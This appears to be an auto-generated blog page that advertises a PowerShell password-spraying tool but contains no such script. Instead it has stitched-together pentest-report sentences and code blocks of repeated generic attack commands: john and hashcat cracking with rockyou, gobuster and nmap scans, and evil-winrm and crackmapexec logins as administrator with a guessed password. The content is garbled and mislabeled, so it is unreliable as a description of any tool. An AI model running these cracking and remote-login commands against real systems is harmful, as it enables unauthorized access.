---
TitleSEO: "Password Spraying Tool in PowerShell | ZureFX"
TitlePost: "Password Spraying Tool — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for password spraying tool. Built for security research and automation."
Keywords: "bash, scanner, script, tool, rust, powershell"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-119.html"
URL_IMAGES: ""
Date: "2025-01-16"
Tags: "Bash, Scanner, Script, Tool, Rust, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-119"
Permalink: "/scripting/script-password-spraying-tool-119.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `lookupsid`
- `crackmapexec`
- `msfvenom`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.34.10.131/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.125.166.128 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.42.228.181 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p3389,22,5986 10.122.47.100 -oN scan.txt
feroxbuster -h
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.106.62.25 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p27017,27017,139 10.26.47.59 -oN scan.txt
crackmapexec smb 10.78.101.97 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 3 results
[+] Done in 7.60s
```
